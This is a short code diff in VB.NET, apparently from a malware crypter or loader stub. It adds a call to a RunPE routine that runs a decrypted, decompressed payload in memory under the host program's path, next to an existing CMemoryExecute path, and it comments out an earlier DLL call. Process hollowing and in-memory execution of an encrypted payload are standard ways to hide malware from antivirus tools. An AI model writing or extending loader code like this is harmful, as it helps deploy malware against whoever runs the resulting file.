@@ -99,8 +99,9 @@ Class Stuff
 
 
         If Payload(Start - 16) = &H54 Then
-            Dim f As New dll.Class1
-            f.Main(Application.ExecutablePath)
+            '  Dim f As New dll.Class1
+            '  f.Main(Application.ExecutablePath)
+            RunPe2.Class1.Run(AES_Decrypt(Decompress(NewByts)), Command, Application.ExecutablePath)
         Else
             CMemoryExecute.Run(AES_Decrypt(Decompress(NewByts)), AppPath)
         End If
